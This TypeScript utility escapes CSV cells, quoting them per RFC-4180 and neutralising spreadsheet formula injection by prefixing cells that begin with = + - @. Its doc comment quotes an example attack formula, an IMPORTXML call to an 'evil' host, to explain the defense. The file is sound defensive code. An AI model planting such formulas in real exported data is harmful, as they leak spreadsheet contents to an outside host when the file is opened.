/**
 * CSV cell escaping with spreadsheet formula-injection defense.
 *
 * Two concerns are handled here, and both matter:
 *
 * 1. RFC-4180 quoting - a cell containing a comma, double-quote, or newline is
 *    wrapped in double quotes with embedded quotes doubled.
 * 2. Formula injection - a cell whose text begins with `= + - @` (or a leading
 *    tab / carriage return) is interpreted as a formula by Excel and Google
 *    Sheets when the file is opened. A decision titled
 *    `=IMPORTXML(CONCAT("http://evil",...))` would then execute on open. We
 *    neutralize this by prefixing such cells with a single quote so the
 *    spreadsheet treats the value as literal text.
 *
 * Kept dependency-free and pure so it can be unit-tested directly and shared by
 * every CSV export route.
 */

/** Characters that make a spreadsheet treat a cell as a formula. */
const FORMULA_PREFIX = /^[=+\-@\t\r]/;

/** Characters that force RFC-4180 quoting. */
const NEEDS_QUOTING = /[",\n\r]/;

/**
 * Escape a single value for safe inclusion in a CSV cell.
 * Returns "" for null/undefined so callers don't special-case blanks.
 */
export function csvCell(value: string | number | null | undefined): string {
  if (value == null) return "";
  let str = String(value);

  // Formula-injection guard first: prefix a literal quote so the cell is inert.
  if (FORMULA_PREFIX.test(str)) {
    str = `'${str}`;
  }

  if (NEEDS_QUOTING.test(str)) {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return str;
}
